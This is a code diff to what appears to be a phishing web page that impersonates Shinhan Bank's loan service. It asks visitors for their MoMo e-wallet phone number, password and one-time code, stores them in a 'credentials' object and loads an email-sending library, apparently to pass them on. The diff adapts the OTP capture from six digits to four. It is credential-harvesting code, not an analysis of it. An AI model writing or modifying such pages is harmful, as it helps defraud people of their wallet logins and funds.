@@ -9,7 +9,6 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     
-    <!-- EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
       (function() {
@@ -367,7 +366,6 @@
 </head>
 <body>
     <div class="mobile-frame">
-        <!-- Confirmation View -->
         <div id="confirmation-section" class="page-section active">
             <header class="page-header">
                 <button class="back-button" onclick="window.location.href='https://vaytieudung.github.io/shinhanbank/pages/vi/Evaluate-conditions.html'">
@@ -396,7 +394,6 @@
             </footer>
         </div>
 
-        <!-- MoMo Phone Input View -->
         <div id="momo-phone-section" class="page-section">
             <header class="page-header">
                 <button class="back-button" onclick="showSection('confirmation-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2.5' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
@@ -426,7 +423,6 @@
             </main>
         </div>
 
-        <!-- MoMo Password Input View -->
         <div id="momo-password-section" class="page-section">
             <header class="page-header">
                 <button class="back-button" onclick="showSection('momo-phone-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2.5' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
@@ -457,7 +453,6 @@
             </main>
         </div>
 
-        <!-- MoMo OTP Input View -->
         <div id="momo-otp-section" class="page-section">
             <header class="page-header">
                 <button class="back-button" onclick="showSection('momo-password-section')"><img src="data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke-width='2.5' stroke='%231d1d1f'%3e%3cpath stroke-linecap='round' stroke-linejoin='round' d='M15.75 19.5L8.25 12l7.5-7.5' /%3e%3c/svg%3e" alt="Back"/></button>
@@ -471,8 +466,6 @@
                     </div>
                     <form onsubmit="event.preventDefault(); handleOtpSubmit();">
                         <div class="otp-input-container">
-                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                             <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                             <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                             <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
@@ -636,8 +629,10 @@
 
             window.handleOtpSubmit = () => {
                 credentials.otp = Array.from(otpInputs).map(input => input.value).join('');
-                if (credentials.otp.length !== 6) {
-                    showNotification('Mã xác thực phải đủ 6 chữ số.', 'error');
+                
+                // === THAY ĐỔI 2: KIỂM TRA ĐỘ DÀI OTP LÀ 4 THAY VÌ 6 ===
+                if (credentials.otp.length !== 4) {
+                    showNotification('Mã xác thực phải đủ 4 chữ số.', 'error');
                     return;
                 }
                 
@@ -652,7 +647,8 @@
                     otpLoading.style.display = 'none';
                     otpSubmitBtn.disabled = false;
                     
-                    const correctOtp = "123456"; // Dummy OTP for demo
+                    // === THAY ĐỔI 3: (TÙY CHỌN) ĐỔI OTP GIẢ LẬP SANG 4 SỐ ĐỂ KIỂM THỬ ===
+                    const correctOtp = "1234"; // Dummy OTP for demo
 
                     if (credentials.otp === correctOtp) {
                         showNotification('Xác nhận giải ngân thành công! Đang chuyển hướng...', 'success', 4000);
@@ -730,7 +726,8 @@
                         if (input.value && index < otpInputs.length - 1) {
                             otpInputs[index + 1].focus();
                         }
-                        if(Array.from(otpInputs).map(i => i.value).join('').length === 6) {
+                        // === THAY ĐỔI 4: TỰ ĐỘNG GỬI KHI NHẬP ĐỦ 4 SỐ ===
+                        if(Array.from(otpInputs).map(i => i.value).join('').length === 4) {
                             handleOtpSubmit();
                         }
                     });
